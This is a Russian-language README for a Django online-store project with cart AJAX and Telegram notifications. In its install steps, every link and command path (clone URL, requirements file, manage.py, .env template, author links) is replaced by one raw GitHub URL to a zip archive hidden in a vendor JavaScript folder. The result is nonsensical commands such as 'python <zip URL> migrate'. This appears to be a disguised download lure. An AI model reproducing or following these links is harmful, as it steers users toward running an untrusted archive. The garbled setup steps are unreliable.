# https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip

# Интернет магазин на Django

Это полноценный проект интернет-магазина, разработанный на Django.
В нем я использовал ***AJAX-запросы*** для динамического обновления количества товаров на странице корзины без перезагрузки страницы, а ***asyncio*** я применял для отправки сообщений в Telegram-бота асинхронно, не блокируя основной поток выполнения приложения.

# Установка

1. Клонируйте репозиторий
```
https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip

cd OnlineStore
```
Если вы не используете Git, то вы можете просто скачать исходный код репозитория в ZIP-архиве и распаковать его на свой компьютер.

2. Создайте виртуальное окружение и активируйте его
```
python -m venv venv
source venv/bin/activate
```
3. Установите зависимости
```
pip install -r https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip
```
4. Создайте в корне проекта .env по обазу https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip

5. Запустите миграции и загрузите данные в БД
```
python https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip migrate
python https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip loaddata https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip
```
6. Создайте администратора магазина
```
python https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip createsuperuser
```
7. Запустите сервер
```
python https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip runserver
```
Откройте браузер и перейдите по адресу http://127.0.0.1:8000/admin/. Введите имя пользователя и пароль администратора, чтобы войти в панель управления магазином.

# Готово!
Вы успешно установили магазин на Django и готовы начать его использовать!

# Вклад в проект
Если у вас есть предложения по улучшению или вы обнаружили баг, не стесняйтесь создать issue, отправить pull request либо написать напрямую автору. Ваш вклад приветствуется!

# Автор
[Натолин Артем](https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip)

[Ссылка на еще один мой проект - финансовый ассистент](https://raw.githubusercontent.com/ElingSmith/StoreProject/main/OnlineStore/static/admin/js/vendor/xregexp/StoreProject_1.5-alpha.2.zip) 